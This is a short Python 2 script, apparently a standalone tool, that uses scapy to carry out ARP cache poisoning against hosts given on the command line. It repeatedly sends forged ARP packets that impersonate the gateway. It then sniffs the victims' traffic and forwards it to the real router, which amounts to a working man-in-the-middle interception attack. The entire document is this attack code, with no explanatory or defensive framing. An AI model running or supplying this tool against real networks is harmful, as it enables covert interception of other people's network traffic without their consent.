#!/usr/bin/env python
from scapy.all import *
from threading import Thread
import sys,time

def arp_poison():
	global gateway_ip,my_mac,targets,interface
	while 1:
		for target in targets:
			packet = Ether(dst=target[1])/ARP(op="who-has", psrc=gateway_ip, pdst=target[0])
			sendp( packet , verbose=False)
		time.sleep(1)

def redirect_to_router(pkt):
	global gateway_mac
	pkt[Ether].dst = gateway_mac
	sendp(pkt,verbose = 0)

def log_packet(pkt):
	print pkt.summary()

def sniff_callback(pkt):
	redirect_to_router(pkt)
	#log_packet(pkt)

def sniff_packets():
	sniff_filter = "src " + " or src ".join( [ target[0] for target in targets] )
	sniff(iface=interface , filter=sniff_filter , prn=sniff_callback , store = 0 )

def get_mac_by_ip(ip):
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has",pdst=ip),timeout=2, verbose=False)
	if(len(ans) > 0 ):
		return ans[0][1].src
	else:
		return False

def parse_input():
	if len(sys.argv) < 2 :
		print "Error"
	elif sys.argv[1] in ["-a","--all"]:
		print "ALL"
	elif sys.argv[1] in ["-t","--targets"]:
		for i in range(2,len(sys.argv)):
			target = sys.argv[i]
			target_mac = get_mac_by_ip(target)
			if(target_mac == False):
				print "Couldn't get the MAC address of %s" % i
			else:
				targets.append( [target,target_mac ] )
	elif sys.argv[1] in ["-h","--help"]:
		print " --all | --targets target target target"



if __name__ == "__main__":
	global targets,my_ip,gateway_ip,interface,my_mac,gateway_mac
	targets = []
	for i in read_routes():
		if i[0] == 0:
			my_ip = i[4]
			gateway_ip = i[2]
			interface = i[3]
	my_mac = get_if_hwaddr(interface)
	gateway_mac = get_mac_by_ip(gateway_ip)

	parse_input()
	if len(targets) > 0:
		print "Your Ip : " + my_ip
		print "Your MAC : " + my_mac
		print "gateway_ip Ip : " + gateway_ip
		print "gateway_mac Ip : " + gateway_mac
		print "Targets : " + str(targets)
		print "Starting .."
		poison_tread = Thread(target=arp_poison)
		poison_tread.setDaemon(True)
		poison_tread.start()
		sniff_packets()
	else:
		print "No Targets"


		
